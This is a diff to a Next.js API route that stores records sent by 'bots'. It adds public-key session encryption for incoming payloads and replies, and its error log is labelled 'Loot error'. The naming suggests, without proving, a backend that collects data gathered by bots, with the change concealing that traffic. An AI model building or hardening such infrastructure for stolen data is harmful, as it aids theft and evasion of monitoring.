@@ -1,5 +1,6 @@
 import { createClient } from "@supabase/supabase-js";
 import { NextRequest, NextResponse } from "next/server";
+import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";
 
 function getSupabase() {
     return createClient(
@@ -10,7 +11,19 @@ function getSupabase() {
 
 export async function POST(request: NextRequest) {
     try {
-        const body = await request.json();
+        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
+        if (!botPubKeyB64) {
+            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
+        }
+
+        const sessionKey = await deriveSessionKey(botPubKeyB64);
+
+        const encData = await request.json();
+        if (!encData || !encData.iv || !encData.ciphertext) {
+            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
+        }
+
+        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
         const { bot_id, category, title, content, priority, metadata } = body;
 
         if (!bot_id || !title) {
@@ -33,7 +46,8 @@ export async function POST(request: NextRequest) {
             return NextResponse.json({ error: "insert failed" }, { status: 500 });
         }
 
-        return NextResponse.json({ status: "ok" });
+        const encResponse = await encryptPayload(sessionKey, { status: "ok" });
+        return NextResponse.json(encResponse);
     } catch (e) {
         console.error("Loot error:", e);
         return NextResponse.json({ error: "internal error" }, { status: 500 });
